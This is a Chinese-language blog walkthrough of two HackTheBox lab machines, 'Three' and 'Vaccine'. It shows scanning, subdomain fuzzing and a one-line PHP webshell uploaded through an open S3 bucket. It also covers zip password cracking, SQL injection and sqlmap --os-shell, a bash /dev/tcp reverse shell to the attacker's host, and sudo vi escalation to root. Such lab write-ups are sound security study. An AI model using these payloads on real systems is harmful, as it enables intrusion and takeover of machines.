---
title: HackTheBox记录
published: 2026-06-16T13:00:00
description: hackthebox靶场记录，持续更新。
tags:
  - HackTheBox
category: 网络安全
draft: false
---

# 靶场通关记录

# 靶场：Three

Target IP Address目标IP地址：10.129.227.248

## Task 1

How many TCP ports are open?  

端口扫描：
**-sC**  使用默认脚本扫描
**-sV**  探测服务/版本信息
```
nmap -sC -sV 10.129.227.248
```

使用无ping扫描：
```
nmap -Pn 10.129.227.248
```

注意到回显结果
```
└─$ nmap -Pn 10.129.227.248
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-15 23:04 -0400
Nmap scan report for bogon (10.129.227.248)
Host is up (0.40s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

answer：2

## Task 2

What is the domain of the email address provided in the "Contact" section of the website?

直接访问ip进行查找

answer：thetoppers.htb

## Task 3

In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
在没有DNS服务器的情况下，我们可以使用哪个Linux文件来解析主机名到IP地址，以便访问指向这些主机名的网站？

修改hosts文件，将域名与IP对应
```
┌──(kali㉿kali)-[~/Desktop]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.129.227.248 thetoppers.htb

```

**本地静态解析**主机名（或域名）到 IP 地址，优先级**高于 DNS**（系统会先查 hosts 文件，如果找到映射就直接使用，不再查询 DNS）。

answer：/etc/hosts

## Task 4

Which sub-domain is discovered during further enumeration?

使用fuff扫描子域名

**前置**：
安装seclists，这样会有几个特定用途的字典
```
sudo apt update
sudo apt install seclists -y
ls -l /usr/share/seclists
```
**参数**：
1. `-c`：表示对HTTP响应代码进行自动匹配和过滤，只显示有效的响应。
2. `-w ./dict.txt`：指定字典文件，用于枚举URL路径
3. `-u 'http://192.168.198.12?FUZZ=/etc'`：指定目标URL，其中 ==`FUZZ`是ffuf的关键词，代表需要替换的位置，这里用它替换了URL路径的一部分，即 `/etc`。ffuf会把字典中的每个元素替换到 `FUZZ` 位置并访问相应的URL。==
4. `-H 'Host: FUZZ.example.com'`：修改 Host 头，发现同一 IP 下的不同子域名。==其他用法还可以修改**指定认证信息**、**伪造客户端标识**、**自定义 Cookie**、**指定内容类型**==
5. `-fs 0,8`：过滤响应大小，这里表示只显示响应大小在0到8字节之间的结果。这个参数可以帮助过滤掉不必要的响应。==一般是初次扫过后，大致判断无用的响应后的大小再过滤==。
6. `-ac` ：该参数的工作流程分为三步：
   **发送探测包**：在正式扫描前，`ffuf` 会先向目标发送一个**几乎不可能存在的随机字符串**（例如 `fsd8f7s9f`）作为请求。
   **建立响应基线**：分析刚才那个"不存在"请求返回的**特征**。这包括响应的状态码（如 200）、内容大小（Content-Length）、字数、行数等。
   **自动创建过滤器**：根据这个基线，`ffuf` 会自动生成一套过滤规则。在后续扫描中，**任何与基线响应特征相同的结果都会被自动隐藏**。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ffuf -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb" \      
     -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -mc all -o scan.json -of json

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 306) | .input.FUZZ' 

gc._msdcs

┌──(kali㉿kali)-[~/Desktop]
└─$ cat scan.json | jq -r '.results[] | select(.length == 21) | .input.FUZZ'
 
s3

```

或者使用gobuster
```
gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS /subdomains-top1million-20000.txt --append-domain

```

之后将s3添加到/etc/hosts

**参数**：
1. `tee`：同时输出到文件和屏幕，既能写入文件，又能显示在终端。
2. `-a`：在文件**末尾添加**，而不是覆盖整个文件。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts        
10.129.227.248 s3.thetoppers.htb

```

answer：s3.thetoppers.htb

## Task 5

Which service is running on the discovered sub-domain?

子领域（s3.）的前缀是一个非常重要的线索。试着在谷歌搜索“s3 service”，了解哪家主要公司提供这项技术。提交标记时，您需要同时提供公司名称和服务名称

answer：Amazon S3

## Task 6

Which command line utility can be used to interact with the service running on the discovered sub-domain?

在Linux中使用Amazon S3经常使用 AWS CLI 进行对象管理，所以在这里需要下载AWS CLI

answer：awscli

## Task 7

Which command is used to set up the AWS CLI installation?

以下为官方文档解释：
运行此命令可快速设置和查看凭证、区域和输出格式。以下示例显示了示例值。
```
$ aws configure
AWS Access Key ID [None]: 
AWS Secret Access Key [None]: 
Default region name [None]:
Default output format [None]: 

```

answer：aws configure

## Task 8

What is the command used by the above utility to list all of the S3 buckets?

查阅官方文档，需要先进行配置，也就是上一步的操作，随便填写，之后在官方文档中找出S3的命令示例

**参数**：
`--endpoint-url<string> `
指定要将请求发送到的 URL。对于大多数命令，AWS CLI 会根据所选服务和指定的 AWS 区域自动确定 URL。但是，某些命令需要您指定账户专用 URL。您还可以配置一些 AWS 服务直接在您的私有 VPC 中托管端点（然后可能需要指定该端点）。

所以在命令中需要指定到本地的s3服务

```
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls
2026-06-15 22:57:48 thetoppers.htb
                                                                             
┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php

```

answer：aws s3 ls

## Task 9

This server is configured to run files written in what web scripting language?

答案在上题中已经很明显了

answer：PHP

## Task 10

Submit the flag located in /var/www/.

官方文档指出以下 `cp` 命令会将单个文件复制到指定的存储桶和密钥

```
┌──(kali㉿kali)-[~/Desktop]
└─$ echo '<?php system($_GET["cmd"]); ?>' > webshell.php  

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 cp webshell.php s3://thetoppers.htb
upload: ./webshell.php to s3://thetoppers.htb/webshell.php    

┌──(kali㉿kali)-[~/Desktop]
└─$ aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
                           PRE images/
2026-06-15 22:57:48          0 .htaccess
2026-06-15 22:57:48      11952 index.php
2026-06-16 01:05:58         31 webshell.php

```

url：`http://thetoppers.htb/webshell.php?cmd=ls ../`，发现存在flag.txt

url：`http://thetoppers.htb/webshell.php?cmd=cat ../flag.txt`，拿到flag

answer：a980d99281a28d638ac68b9bf9453c2b

# 靶场：Vaccine

## Task 1

Besides SSH and HTTP, what other service is hosted on this box?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nmap -sC -sV 10.129.95.174
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 09:29 -0400
Nmap scan report for 10.129.95.174
Host is up (0.42s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.17.123
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

answer：FTP

## Task 2

This service can be configured to allow login with any password for specific username. What is that username?

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ftp 10.129.95.174         
Connected to 10.129.95.174.
220 (vsFTPd 3.0.3)
Name (10.129.95.174:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 

```

answer：anonymous

## Task 3

What is the name of the file downloaded over this service?

```
ftp> ls
229 Entering Extended Passive Mode (|||10248|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

```

answer：backup.zip

## Task 4

What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?

这个需要自行Google，外网查到的资料是：

**zip2john（zip to john）** 的核心作用是**把加密的压缩包变成密码破解工具能听懂的「数字指纹」（哈希值）**。
**开膛手（John the Ripper）** 的核心作用就是：**拿着这个「数字指纹」，在电脑里疯狂“对暗号”，把真正的密码试出来**。

answer：zip2john

## Task 5



先获取该压缩文件，尝试解压该文件发现需要密码

```
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10072|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |**********************************************************************************************************************************************************************|  2533       12.58 KiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (3.36 KiB/s)
ftp> 

┌──(kali㉿kali)-[~/Desktop]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password

```

此时使用z2john计算压缩包hash值并将结果存入文件中

```
┌──(kali㉿kali)-[~/Desktop]
└─$ zip2john backup.zip > backup.hash
Created directory: /home/kali/.john
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

```

现在使用使用John开膛手核心引擎加载rockyou字典，对 ZIP 哈希进行爆破撞库

需要注意：先解压rockyou这个字典，默认是压缩包的形式

```
┌──(kali㉿kali)-[~/Desktop]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2026-06-16 10:10) 33.33g/s 273066p/s 273066c/s 273066C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

解压目标（backup.zip）后，查看.php代码文件拿到账号和密码。账号为admin，密码经过MD5解密后为：qwerty789

```
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
  
```

或者将密码复制并单独存放一个文件，使用hashcat枚举密码 
**参数**：
1. `-a`： --attack-mode=NUM 攻击模式，0 = 字典攻击，1 = 组合攻击，3 = 掩码攻击  
2. `-m`：--hash-type=NUM 哈希类别，0 = MD5

```
hashcat -a 0 -m 0 pass.txt /usr/share/wordlists/rockyou.txt

```

answer：qwerty789

## Task 6

What option can be passed to sqlmap to try to get command execution via the sql injection?

进入之后只有一个简单的界面，含有一个搜索框，于是尝试sql注入

`1' or '1' = '1' --`，发现为返回了所有数据，又尝试了确认列数，当进行到`1' order by 6--`时发生了报错，确认列数为5行，存在sql注入点

确认之后，尝试使用sqlmap对该站点进行扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=111'  
        ___
       __H__                                                                                                                                 
 ___ ___[(]_____ ___ ___  {1.10.2#stable}                                                                                                    
|_ -| . [.]     | .'| . |                                                                                                                    
|___|_  [,]_|_|_|__,|  _|                                                                                                                    
      |_|V...       |_|   https://sqlmap.org                                                                                                 

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:52:04 /2026-06-16/

[10:52:04] [INFO] testing connection to the target URL
got a 302 redirect to 'http://10.129.95.174/index.php'. Do you want to follow? [Y/n] 

you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7gipfabvt7k...slt6oshbrt'). Do you want to use those [Y/n] 

[10:52:09] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:52:10] [INFO] testing if the target URL content is stable
[10:52:12] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1'). You are advised to rerun with '--forms --crawl=2'

[*] ending @ 10:52:12 /2026-06-16/

```

`got a 302 redirect to 'http://10.129.95.174/index.php'`，发现重定向到了index.php，再使用sqlmap将cookie携带进行扫描

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=111' --cookie='PHPSESSID=sj5r9p95lq6eegg2pli12ln96q'


sqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:
---
Parameter: search (GET)
    Type: stacked queries
    Title: PostgreSQL > 8.1 stacked queries (comment)
    Payload: search=111';SELECT PG_SLEEP(5)--

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: search=111' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(98)||CHR(118)||CHR(122)||CHR(113))||(CHR(68)||CHR(111)||CHR(114)||CHR(78)||CHR(75)||CHR(115)||CHR(101)||CHR(69)||CHR(77)||CHR(77)||CHR(115)||CHR(79)||CHR(101)||CHR(78)||CHR(66)||CHR(112)||CHR(87)||CHR(65)||CHR(114)||CHR(82)||CHR(71)||CHR(78)||CHR(122)||CHR(102)||CHR(90)||CHR(110)||CHR(99)||CHR(100)||CHR(113)||CHR(102)||CHR(72)||CHR(85)||CHR(80)||CHR(90)||CHR(114)||CHR(80)||CHR(71)||CHR(78)||CHR(71)||CHR(119))||(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)),NULL,NULL-- EPGn
---
[11:01:02] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 19.10 or 20.04 or 20.10 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[11:01:07] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.129.95.174'


```

确认search确实存在sql注入，`Type: stacked queries`说明可以进行堆叠查询，后端数据库为postgresql，目标服务器是Ubuntu，确认一下版本信息为19.10

```
┌──(kali㉿kali)-[~/Desktop]
└─$ sqlmap -u 'http://10.129.95.174/dashboard.php?search=1' --cookie='PHPSESSID=sj5r9p95lq6eegg2pli12ln96q' --sql-shell

sql-shell> select version();
[11:03:37] [INFO] fetching SQL SELECT statement query output: 'select version()'
select version(): 'PostgreSQL 11.7 (Ubuntu 11.7-0ubuntu0.19.10.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.2.1-9ubuntu2) 9.2.1 20191008, 64-bit'

```

目标是 **PostgreSQL**，而 PostgreSQL 有一个著名的命令执行方式：`COPY (SELECT '') TO PROGRAM 'whoami'`，这个功能需要**超级用户权限**，但很多管理员为了方便，直接用 `postgres` 超级用户运行数据库服务。

而**sqlmap 的 `--os-shell` 底层就是封装了这个过程**：
```
1. 创建一张临时表  
2. 用 `COPY ... FROM PROGRAM` 执行系统命令  
3. 把命令结果写入临时表  
4. 读取临时表返回给用户
   
```

针对一系列，所以需要使用到sqlmap的`--os-shell`，如果用户权限不够，这条命令会失败，获取到shell即为成功

answer：--os-shell

## Task 7

What program can the postgres user run as root using sudo?

answer在Task 9中

## Task 8

因为已经拿到shell，**根据端口开放情况选择攻击路径**

在扫描端口时发现目标的（21/22/80）开放，说明就可以进行反向shell，这里科普一下如何选择正反向连接：

1. 正向 Shell（目标监听，你连目标）
**前提**：目标必须**开放某个端口**并允许外部连接进来。

|      端口       | 能否用于正向 Shell |                          原因                          |
| :-----------: | :----------: | :--------------------------------------------------: |
| **21 (FTP)**  |     不推荐      |              FTP 服务已占用 21 端口，你无法再用它起监听               |
| **22 (SSH)**  |     不推荐      |                  SSH 已占用 22 端口，无法复用                  |
| **80 (HTTP)** |     不推荐      |                   Apache 已占用 80 端口                   |
|  **其他未开放端口**  |    **可以**    | 你可以在目标上用 nc/python 监听 4444、6666、8080 等端口，前提是防火墙没拦截入站 |

**结论**：正向 Shell 不能用这些已占用的端口，但可以用**其他未使用的端口**（比如 4444、6666、8080、8888），前提是**防火墙允许入站访问这些端口**。

2. 反向 Shell（目标连你，你监听）
**前提**：目标能够**主动向外发起 TCP 连接**。

|             端口             |   能否用于反向 Shell   |                      原因                       |
| :------------------------: | :--------------: | :-------------------------------------------: |
| **目标开放了 TCP 端口（21/22/80）** | **证明了 TCP 出站可用** |  目标能开放端口，说明它具备完整的 TCP 协议栈，**肯定能发起 TCP 出站连接**  |
|         **你的监听端口**         |      **随便选**     | 你可以用 4444、6666、80、443、53 等任意端口监听，只要目标能访问你的 IP |

对目标机的操作：

```
os-shell> bash -c 'bash -i >& /dev/tcp/10.10.17.123/4444 0>&1'

```

攻击机的操作：

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.123] from (UNKNOWN) [10.129.95.174] 38992

```

拿下shell之后，得到user的flag

```
postgres@vaccine:/home$ cd ~
cd ~
postgres@vaccine:/var/lib/postgresql$ ls
ls
11
user.txt
postgres@vaccine:/var/lib/postgresql$ cat user.txt
cat user.txt
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:/var/lib/postgresql$ 

```

answer：ec9b13ca4d6229cd5cc1e09980965bf7

## Task 9

查看网站代码，发现数据库连接配置，使用信息用ssh进行连接

```
postgres@vaccine:/var/www/html$ cat dashboard.php | grep user
cat dashboard.php | grep user
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");

```

```
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh postgres@10.129.95.174
The authenticity of host '10.129.95.174 (10.129.95.174)' can't be established.
ED25519 key fingerprint is: SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.95.174' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
postgres@10.129.95.174's password: 

```

查看当前用户的权限，`sudo -l` 的结果表明，`postgres` 用户可以通过 `sudo` 以 `root` 权限执行 `/bin/vi /etc/postgresql/11/main/pg_hba.conf`，利用 `vi` 的 `:!/bin/bash` 功能来获取一个 `root` 权限的 Shell

关于为什么能成功提取root权限的shell解释：
`vi` 这个编辑器进程，它的 **有效用户ID（EUID）是 0（root）**，在 `vi` 编辑器中，`:!` 是一个**外部命令执行功能**，而 `:!/bin/bash` 就是暂停 `vi`，执行 `/bin/bash`，启动一个新的 Shell

总结： **`sudo vi` 让 `vi` 变成 root 权限 → `:!/bin/bash` 利用 `vi` 开启一个 root 权限的新终端 → `whoami` 确认已经是 root。**

```
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf

postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf

```

**注意**：需要在 `vi` 的**命令模式**下输入`:!/bin/bash`之后回车，这个命令的意思是：**暂停 `vi` 编辑器，并启动一个 `/bin/bash` Shell**，如果返回后看到的是root@xxx即为提权成功，至此成功拿下root的flag

```

root@vaccine:/var/lib/postgresql# ls
11  user.txt
root@vaccine:/var/lib/postgresql# cd /root
root@vaccine:~# ls
pg_hba.conf  root.txt  snap
root@vaccine:~# cat root.txt 
dd6e058e814260bc70e9bbdef2715849
  
```

Task 7的answer：vi
answer：dd6e058e814260bc70e9bbdef2715849